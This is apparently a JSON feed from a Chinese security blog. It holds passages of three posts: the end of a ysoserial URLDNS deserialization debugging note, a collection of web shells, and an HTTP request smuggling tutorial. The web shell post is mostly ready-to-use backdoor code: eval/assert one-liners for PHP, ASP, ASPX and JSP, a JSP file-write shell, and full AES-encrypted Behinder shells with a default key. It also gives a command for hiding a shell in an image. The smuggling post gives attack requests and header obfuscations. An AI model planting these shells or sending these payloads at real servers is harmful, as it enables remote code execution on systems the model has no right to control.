alt=\"\"></p>\n<p>后面继续跟进就是地址的具体查询过程了，无了无了</p>\n<p>下图是漏洞触发的调用栈</p>\n<p><img src=\"29.png\" alt=\"\"></p>\n<h1 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h1>\n<p><strong>payload 构造</strong></p>\n<p>将我们输入的 dns 地址存储在 URL 对象中 -&gt; 将 URL 对象作为 key 存储在 HashMap 中 -&gt; 由于作为 key 值，在 put 时会进行 hash 计算，那我们就通过反射更改其 hashCode 值为 - 1</p>\n<p><strong>漏洞触发</strong></p>\n<p>反序列化 HashMap 时，会调用 hash () 计算 key 的 hash 值 -&gt; 计算时，调用 (URL 对象) key#hashCode () -&gt; 由于我们将该对象的 hashCode 值设置为 - 1，所以会调用 handler.hashCode () -&gt; 其中获取地址的代码， <code> InetAddress addr = getHostAddress(u);</code>  实际上就是一次 DNS 查询</p>\n<p><strong>小彩蛋</strong></p>\n<p>在构造 payload，ht.put () 时，由于 URL 的 hashCode 值为 - 1，所以同样会调用 handler.hashCode () 触发 DNS 查询，可是为什么我们只能获取到一条 dns 查询记录，而不是两条呢？</p>\n<p>直接在 DNS 查询处下断点</p>\n<p>生成 payload 时，进入 URLStreamHandler#hashCode 查看当前变量</p>\n<p><img src=\"31.png\" alt=\"\"></p>\n<p>反序列化时，进入 URLStreamHandler#hashCode 查看当前变量</p>\n<p><img src=\"32.png\" alt=\"\"></p>\n<p>可以发现获取到的 addr 有值了，为 <code>域名/127.0.0.1</code></p>\n<p>那么同样是将 <code>http://ysmzza.dnslog.cn</code>  传入 <code>getHostAddress(u)</code>  得到的结果却不一样呢？</p>\n<p>那么我们再进入 <code>getHostAddress(u)</code>  进行对比</p>\n<p>构造 payload 进入 <code>getHostAddress(u)</code>  时，如下图</p>\n<p><img src=\"33.png\" alt=\"\"></p>\n<p><img src=\"34.png\" alt=\"\"></p>\n<p>这里调用的 SilentURLStreamHandler#getHostAddress 直接返回的 null</p>\n<p>注释:</p>\n<blockquote>\n<p>这个 URLStreamHandler 实例用于在创建 URL 实例时避免任何 DNS 解析。 DNS 解析用于漏洞检测。重要的是不要在使用序列化对象之前探测给定的 URL。潜在的误报：如果首先从测试计算机解析 DNS 名称，则目标服务器可能会获得缓存击中第二个决议。</p>\n</blockquote>\n<p>而在我们反序列化后进入 <code>getHostAddress(u)</code> ，URL 对象中的 handler 就是默认的 handler 了，因而会触发 DNS 查询</p>\n<p>所以 POC 中定义 URLStreamHandler 内部类，避免生成 paayload 时进行 DNS 解析（其实看注释就能看到，但我一开没有看到这里的代码 (๑・́ωก̀๑)  ）</p>\n<p><strong>小问题</strong></p>\n<ol>\n<li>\n<p>漏洞是通过 URLStreamHandler#hashCode 触发的，那么这个 handler 是啥玩意？</p>\n</li>\n<li>\n<p>new URL 对象时，一定要传入 handler 才能触发漏洞吗？如果不传入 handler，程序还能正常运行吗？（因为 HashMap#put 时会调用 URLStreamHandler#hashCode）会有默认的 handler 给我们调用吗？</p>\n</li>\n</ol>\n<p>查查 API</p>\n<blockquote>\n<p>抽象类 <code> URLStreamHandler</code>  是所有流协议处理程序的通用类，流协议处理程序知道如何为特定协议类型建立连接，如 <code>http</code>  或 <code>https</code> 。</p>\n<p>在大多数情况下，  <code>URLStreamHandler</code>  子类的实例不是由应用程序直接创建的。  更确切地说，在第一时间构建时的协议名称遇到 <code>URL</code>  ，适当的流协议处理程序被自动加载。</p>\n</blockquote>\n<p>所以流协议程序用于为协议建立连接，并构建时的协议名称遇见 URL 时，适当的流协议处理程序被自动加载</p>\n<p>所以其实不传入 handler，URL 对象也会自动加载 handler</p>\n<p>由小彩蛋的内容可知传入自定义的 handler 只是为了在生成 payload 时不进行 dns 解析</p>\n<h2 id=\"调试遇到的问题未解决\"><a class=\"markdownIt-Anchor\" href=\"#调试遇到的问题未解决\">#</a> 调试遇到的问题（未解决）</h2>\n<p>在尝试代码调试时，发现无法启用 debug</p>\n<p><img src=\"7.png\" alt=\"\"></p>\n<p>看第一行，运行的是 jdk8_32，而我的 idea 是 64 位的，估计是不一致导致的问题（以前经常碰见 tomcat 和 jdk 不一致导致的问题）</p>\n<p>在上方菜单栏 file-&gt;project structure 中可以设置 jdk 版本，更改为 64 位 jdk</p>\n<p><img src=\"8.png\" alt=\"\"></p>\n<p>然后就会报错，程序包 sun.rmi.server 不存在</p>\n<p><img src=\"9.png\" alt=\"\"></p>\n<p>但是在使用 jdk8 运行程序时并没有该错误，ctrl+click 点击进入报错程序包，是可以找到在 java 原生库中的</p>\n<p><img src=\"10.png\" alt=\"\"></p>\n<p>也就是说在编译程序的 classpath 中没有包含’sun.rmi.server’这个包</p>\n<p>我的直觉告诉我是版本的问题，可是上图中 jdk11 的包里面也有这个包的并且已经引入项目中了</p>\n<p>所以我换回 jdk8_32，查看 jar 包的区别</p>\n<p>jdk8：</p>\n<p><img src=\"11.png\" alt=\"\"></p>\n<p>jdk11:</p>\n<p><img src=\"12.png\" alt=\"\"></p>\n<p>难道这个世界有些东西我真的，难以探寻吗，这真的就是我的极限了吗，不，我要去百度！！百度救我！！！</p>\n<p><strong><a href=\"https://xy2401.com/local-docs/oracle/java.zh/11/migrate/#JSMIG-GUID-D7936F0D-08A9-411E-AD2F-E14A38DA56A7\">这里发现</a>，jdk11 不再提供 corba 工具，rmic (RMI 编辑器) 不再支持 - idl 或 - iiop 选项。</strong></p>\n<p>可是 java11 的 api 里面是有 rmi 的🙁</p>\n<p>果然换成 jdk8_64 所有问题迎刃而解，那么这个问题…</p>\n<p>当然不能算解决了，未完待续！</p>\n",
            "tags": [
                "ysoserial调试"
            ]
        },
        {
            "id": "http://example.com/2021/08/12/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/",
            "url": "http://example.com/2021/08/12/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%95%B4%E7%90%86/",
            "title": "一句话木马整理",
            "date_published": "2021-08-12T02:53:49.000Z",
            "content_html": "<h1 id=\"日常系列\"><a class=\"markdownIt-Anchor\" href=\"#日常系列\">#</a> 日常系列</h1>\n<h2 id=\"phtml\"><a class=\"markdownIt-Anchor\" href=\"#phtml\">#</a> phtml</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;milkii0&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"php\"><a class=\"markdownIt-Anchor\" href=\"#php\">#</a> php</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> @<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;milkii0&#x27;</span>]); <span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span> assert(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;milkii0&#x27;</span>]);<span class=\"meta\">?&gt;</span> </span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;O&gt;h=@<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;milkii0&#x27;</span>]);&lt;/O&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"asp\"><a class=\"markdownIt-Anchor\" href=\"#asp\">#</a> asp</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%execute(request(&quot;milkii0&quot;))%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%execute request(&quot;milkii0&quot;)%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%eval request(&quot;milkii0&quot;)%&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"aspx\"><a class=\"markdownIt-Anchor\" href=\"#aspx\">#</a> aspx</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot; %&gt;</span><br><span class=\"line\">&lt;%eval(Request.Item[&quot;milkii0&quot;]);%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%@ Page Language=&quot;Jscript&quot; validateRequest=&quot;false&quot; %&gt;&lt;%Response.Write(eval(Request.Item[&quot;milkii0&quot;],&quot;unsafe&quot;));%&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"jsp\"><a class=\"markdownIt-Anchor\" href=\"#jsp\">#</a> jsp</h2>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%</span><br><span class=\"line\"><span class=\"keyword\">if</span>(request.getParameter(<span class=\"string\">&quot;file_name&quot;</span>)!=<span class=\"keyword\">null</span>)(</span><br><span class=\"line\">    <span class=\"keyword\">new</span> java.io.FileOutputStream(application.getRealPath(<span class=\"string\">&quot;/&quot;</span>)+request.getParameter(<span class=\"string\">&quot;file_name&quot;</span>))).write(request.getParameter(<span class=\"string\">&quot;file_content&quot;</span>).getBytes()</span><br><span class=\"line\">);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n<h1 id=\"冰蝎系列\"><a class=\"markdownIt-Anchor\" href=\"#冰蝎系列\">#</a> 冰蝎系列</h1>\n<h2 id=\"jsp-2\"><a class=\"markdownIt-Anchor\" href=\"#jsp-2\">#</a> jsp</h2>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%<span class=\"meta\">@page</span> <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class=\"line\">&lt;%!</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">U</span> <span class=\"keyword\">extends</span> <span class=\"title\">ClassLoader</span></span>&#123;</span><br><span class=\"line\">    U(ClassLoader c)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Class <span class=\"title\">g</span><span class=\"params\">(<span class=\"keyword\">byte</span> []b)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.defineClass(b,<span class=\"number\">0</span>,b.length);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;%&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\"><span class=\"keyword\">if</span> (request.getMethod().equals(<span class=\"string\">&quot;POST&quot;</span>))&#123;</span><br><span class=\"line\">    String k=<span class=\"string\">&quot;e45e329feb5d925b&quot;</span>;<span class=\"comment\">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span></span><br><span class=\"line\">    session.putValue(<span class=\"string\">&quot;u&quot;</span>,k);</span><br><span class=\"line\">    Cipher c=Cipher.getInstance(<span class=\"string\">&quot;AES&quot;</span>);</span><br><span class=\"line\">    c.init(<span class=\"number\">2</span>,<span class=\"keyword\">new</span> SecretKeySpec(k.getBytes(),<span class=\"string\">&quot;AES&quot;</span>));</span><br><span class=\"line\">    <span class=\"keyword\">new</span> U(<span class=\"keyword\">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class=\"keyword\">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"php-2\"><a class=\"markdownIt-Anchor\" href=\"#php-2\">#</a> php</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">    <span class=\"variable\">$key</span>=<span class=\"string\">&quot;e45e329feb5d925b&quot;</span>; <span class=\"comment\">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class=\"line\">\t<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;k&#x27;</span>]=<span class=\"variable\">$key</span>;</span><br><span class=\"line\">\tsession_write_close();</span><br><span class=\"line\">\t<span class=\"variable\">$post</span>=file_get_contents(<span class=\"string\">&quot;php://input&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(!extension_loaded(<span class=\"string\">&#x27;openssl&#x27;</span>))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$t</span>=<span class=\"string\">&quot;base64_&quot;</span>.<span class=\"string\">&quot;decode&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"variable\">$post</span>=<span class=\"variable\">$t</span>(<span class=\"variable\">$post</span>.<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;strlen(<span class=\"variable\">$post</span>);<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">    \t\t\t <span class=\"variable\">$post</span>[<span class=\"variable\">$i</span>] = <span class=\"variable\">$post</span>[<span class=\"variable\">$i</span>]^<span class=\"variable\">$key</span>[<span class=\"variable\">$i</span>+<span class=\"number\">1</span>&amp;<span class=\"number\">15</span>]; </span><br><span class=\"line\">    \t\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"variable\">$post</span>=openssl_decrypt(<span class=\"variable\">$post</span>, <span class=\"string\">&quot;AES128&quot;</span>, <span class=\"variable\">$key</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    <span class=\"variable\">$arr</span>=explode(<span class=\"string\">&#x27;|&#x27;</span>,<span class=\"variable\">$post</span>);</span><br><span class=\"line\">    <span class=\"variable\">$func</span>=<span class=\"variable\">$arr</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"variable\">$params</span>=<span class=\"variable\">$arr</span>[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">C</span></span>&#123;<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"><span class=\"variable\">$p</span></span>) </span>&#123;<span class=\"keyword\">eval</span>(<span class=\"variable\">$p</span>.<span class=\"string\">&quot;&quot;</span>);&#125;&#125;</span><br><span class=\"line\">    @call_user_func(<span class=\"keyword\">new</span> C(),<span class=\"variable\">$params</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"图片马合成命令\"><a class=\"markdownIt-Anchor\" href=\"#图片马合成命令\">#</a> 图片马合成命令</h1>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">copy 1.jpg+1.php 2.jpg</span><br></pre></td></tr></table></figure>\n<p><img src=\"2.jpg\" alt=\"\"></p>\n",
            "tags": [
                "木马,汇总"
            ]
        },
        {
            "id": "http://example.com/2021/08/03/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/",
            "url": "http://example.com/2021/08/03/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/",
            "title": "HTTP请求走私简述",
            "date_published": "2021-08-03T02:20:54.000Z",
            "content_html": "<h1 id=\"http请求走私是什么\"><a class=\"markdownIt-Anchor\" href=\"#http请求走私是什么\">#</a> HTTP 请求走私是什么</h1>\n<p>HTTP 请求走私，一种干扰网站处理来自用户的 HTTP <ins class=\"wavy\">请求序列</ins> 的技术</p>\n<h2 id=\"相关知识点\"><a class=\"markdownIt-Anchor\" href=\"#相关知识点\">#</a> 相关知识点</h2>\n<p>该漏洞的产生主要和 HTTP 请求中的两个头相关：</p>\n<p><span class=\"spoiler\" title=\"...\">Transfer_Encoding</span>  &amp; <span class=\"spoiler\" title=\"...\">Content-Length</span></p>\n<h3 id=\"transfer-encoding\"><a class=\"markdownIt-Anchor\" href=\"#transfer-encoding\">#</a> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding\">Transfer-Encoding</a></h3>\n<p>Transfer-Encoding 通用标头字段指示已对消息正文应用了什么（如果有）类型的转换，以便在发送方和接收方之间安全地传输它，在 HTTP1.1 中可用</p>\n<p>利用该漏洞，需指定参数为 chunked  <code> Transfer-Encoding: chunked</code> ，表示数据以一系列块发送，而不是等到完整的段可用</p>\n<p>在 CTE 中，每个块前面都有它的大小（字节为单位）</p>\n<p>当接收到零长度块时（不可省略），传输结束</p>\n<p>✋🌰</p>\n<figure class=\"highlight plaintext\"><figcaption><span>数据包喔</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK </span><br><span class=\"line\">Content-Type: text/plain</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\">5\\r\\n</span><br><span class=\"line\">Media\\r\\n</span><br><span class=\"line\">8\\r\\n</span><br><span class=\"line\">Services\\r\\n</span><br><span class=\"line\">4\\r\\n</span><br><span class=\"line\">Live\\r\\n</span><br><span class=\"line\">0\\r\\n</span><br><span class=\"line\">\\r\\n</span><br></pre></td></tr></table></figure>\n<p>第一部分： 当前组块长度（16 进制）+ \\r\\n</p>\n<p>第二部分： 块内容 + \\r\\n</p>\n<p>（例如 Media 就是 5 个字节长度）</p>\n<p>倒数第二部分： 终止块 -&gt; 分块编码以任何大小为零的块结束，长度为 0 -&gt; 0\\r\\n</p>\n<p>最后一部分： 以空行终止（\\r\\n）</p>\n<h3 id=\"content-length\"><a class=\"markdownIt-Anchor\" href=\"#content-length\">#</a> Content-Length</h3>\n<p>该字段指示发送给接受者的实体主体的大小，以十进制的 OCTET 数表示</p>\n<p>这个可以自己用 burp 发包试试哦，bp 的 repeat 选项中默认开启了 Update Content-Length 选项</p>\n<h3 id=\"注意connection\"><a class=\"markdownIt-Anchor\" href=\"#注意connection\">#</a> ⭐注意 Connection</h3>\n<blockquote>\n<p>每当传输编码应用于消息体时，传输编码集必须包括 “分块”，除非消息因关闭连接而终止</p>\n<p>——<a href=\"https://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.6\">HTTP/1.1: Protocol Parameters</a></p>\n</blockquote>\n<p>也就是说，当连接关闭时，也会导致消息终止</p>\n<p>那么我们在发送数据包时，就需要注意 <ins>Connection</ins> 头</p>\n<p>Connection: keep-alive -&gt; 表示客户端希望保持连接打开，拥有持久连接是 HTTP/1.1 请求的默认设置</p>\n<p>Connection: close -&gt; 表示客户端或服务器想要关闭连接，这是 HTTP/1.0 请求的默认设置</p>\n<h1 id=\"http请求走私的原理\"><a class=\"markdownIt-Anchor\" href=\"#http请求走私的原理\">#</a> HTTP 请求走私的原理</h1>\n<p>现很多应用程序使用 HTTP 服务链（2 个或多个服务器）</p>\n<p>其中前端服务器有时称为负载均衡器或反向代理</p>\n<p><img src=\"1.png\" alt=\"burp图片哦\"></p>\n<p>这时，若前端后端系统就请求之间的边界没有达成一致，就可以发送一个模棱两可的请求，让前端和后端系统对该请求进行不同的解释</p>\n<p><img src=\"2.png\" alt=\"\"></p>\n<p>👇👇👇</p>\n<p>由于 HTTP 规范提供了两种方法指定消息长度（Content-Length&amp;Transform-Encoding），所以单个消息​同时使用两种方法时，不同的服务器可能出现不同的解释</p>\n<p>如果消息头以某种方式模糊了，则可以诱导消息头不处理它</p>\n<p>👆👆👆</p>\n<h1 id=\"http请求走私利用\"><a class=\"markdownIt-Anchor\" href=\"#http请求走私利用\">#</a> HTTP 请求走私利用</h1>\n<p>请求走私大致分为 3️⃣种类型</p>\n<ul>\n<li><a href=\"http://CL.ET\">CL.ET</a> -&gt; 前端服务器使用 Content-Length，后端服务器使用 Transfer-Encoding</li>\n<li><a href=\"http://TE.CL\">TE.CL</a> -&gt; 前端服务器使用 Transfer-Encoding，后端服务器使用 Content-Length</li>\n<li>TE.TE -&gt; 前后端均使用 Transfer-Encoding，但其中一个服务器可被某种方式诱导不处理该头部字段</li>\n</ul>\n<h2 id=\"实验环境\"><a class=\"markdownIt-Anchor\" href=\"#实验环境\">#</a> <a href=\"https://portswigger.net/web-security/request-smuggling\">实验环境</a></h2>\n<p>但是不知道为什么我一直没办法注册 portswigger，只能分析一下给出的例子了</p>\n<h3 id=\"clet\"><a class=\"markdownIt-Anchor\" href=\"#clet\">#</a> <a href=\"http://CL.ET\">CL.ET</a></h3>\n<p>攻击数据包</p>\n<figure class=\"highlight plaintext\"><figcaption><span>数据包</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST / HTTP/1.1</span><br><span class=\"line\">Host: vulnerable-website.com</span><br><span class=\"line\">Content-Length: 13</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\"></span><br><span class=\"line\">0</span><br><span class=\"line\"></span><br><span class=\"line\">SMUGGLED</span><br></pre></td></tr></table></figure>\n<p>数据同时使用两种方法指定消息长度</p>\n<p>🎀前服务器处理 Content-Length 头，认为请求主体为 13 字节，刚好至 smuggled 末尾，再将消息转发至后端服务器</p>\n<p>🎀后服务器处理 Transfer-Encoding 头，由上述 Transfer-Encoding 知识点可知，这是一个终止块，那么接下来的 smuggled 不会被处理，后端服务器会将 smuggled 拼接至下一个请求的开始</p>\n<h3 id=\"tecl\"><a class=\"markdownIt-Anchor\" href=\"#tecl\">#</a> <a href=\"http://TE.CL\">TE.CL</a></h3>\n<p>类似 CL.TE</p>\n<figure class=\"highlight plaintext\"><figcaption><span>数据包</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST / HTTP/1.1</span><br><span class=\"line\">Host: vulnerable-website.com</span><br><span class=\"line\">Content-Length: 3</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\"></span><br><span class=\"line\">8</span><br><span class=\"line\">SMUGGLED</span><br><span class=\"line\">0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>（⭐burp 上方 repeater 选项取消 Update Content-Length，这个选项会根据实体长度自动更新 Content-Length 头）</p>\n<p>🎀前服务器处理 Transfer-Encoding 头，第一块 8 个字节，第二块为终止块，请求终止，请求转发至后端服务器</p>\n<p>🎀后服务器处理 Content-Length 头，实体长度为 3，那么从 S 开始的内容，都将被视为序列中下一个请求的开始</p>\n<h3 id=\"tete\"><a class=\"markdownIt-Anchor\" href=\"#tete\">#</a> TE.TE</h3>\n<p>混淆 Transfer-Encoding 头的方式很多，例如</p>\n<ul>\n<li>Transfer-Encoding: xchunked</li>\n<li>Transfer-Encoding : chunked</li>\n<li>Transfer-Encoding: chunked<br>\nTransfer-Encoding: x</li>\n<li>Transfer-Encoding:[tab]chunked</li>\n<li>[space]Transfer-Encoding: chunked</li>\n<li>X: X[\\n]Transfer-Encoding: chunked</li>\n<li>\n<dl>\n<dt>Transfer-Encoding</dt>\n<dd>chunked</dd>\n</dl>\n</li>\n</ul>\n<h1 id=\"检测http请求走私\"><a class=\"markdownIt-Anchor\" href=\"#检测http请求走私\">#</a> 检测 HTTP 请求走私</h1>\n<p>实时站点，流量较大，可能将我们的 payload 拼接至别的用户数据包中</p>\n<p>以下列出一种几乎没有影响其他用户风险的检测手段</p>\n<figure class=\"highlight plaintext\"><figcaption><span>数据包</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /smuggled HTTP/1.1</span><br><span class=\"line\">HOST: example.com</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\">Content-Length: 4</span><br><span class=\"line\"></span><br><span class=\"line\">1</span><br><span class=\"line\">Z</span><br><span class=\"line\">Q</span><br></pre></td></tr></table></figure>\n<h2 id=\"clet-2\"><a class=\"markdownIt-Anchor\" href=\"#clet-2\">#</a> <a href=\"http://CL.ET\">CL.ET</a></h2>\n<p>前端检测实体长度为 4 个字节，Q 不会被转发，后端没有接受到终止块，会一直等待至超时，此时会有明显的延迟效果</p>\n<h2 id=\"clcl\"><a class=\"markdownIt-Anchor\" href=\"#clcl\">#</a> <a href=\"http://CL.CL\">CL.CL</a></h2>\n<p>会被两个系统无害处理</p>\n<h2 id=\"tecl-2\"><a class=\"markdownIt-Anchor\" href=\"#tecl-2\">#</a> <a href=\"http://TE.CL\">TE.CL</a>&amp;TE.TE</h2>\n<p>由于无效的大小块 Q，前端将拒绝该消息，不会将其转发至后端</p>\n<p>那么怎么区分以上两个呢，且看下面这个数据包</p>\n<figure class=\"highlight plaintext\"><figcaption><span>数据包</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /smuggled HTTP/1.1</span><br><span class=\"line\">HOST: example.com</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\">Content-Length: 9</span><br><span class=\"line\"></span><br><span class=\"line\">0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">X</span><br></pre></td></tr></table></figure>\n<p>为 TE.CL 模式时，前端接收终止块，转发 X（不包括 X）以前的内容至后端服务器，共 7 个字节。后端服务器处理 Content-Length 头，认为实体为 9 个字节（&gt;7），此时也会出现明显延迟</p>\n<p>为 TE.TE 时，正确的终止块格式，会被系统无害处理</p>\n<p>⭐burp 商店中也可以找到 HTTP Request Smuggler 模块，可以 scan 出来后，右键 Smuggle attack</p>\n<p>⭐工具：<a href=\"https://github.com/defparam/smuggler\">https://github.com/defparam/smuggler</a></p>\n<h1 id=\"修复http请求走私\"><a class=\"markdownIt-Anchor\" href=\"#修复http请求走私\">#</a> 修复 HTTP 请求走私</h1>\n<h2 id=\"我-不-理-解\"><a class=\"markdownIt-Anchor\" href=\"#我-不-理-解\">#</a> 我 不 理 解</h2>\n<p>在前端服务器通过同一网络连接将多个请求转发到后端服务器的情况下，会出现 HTTP 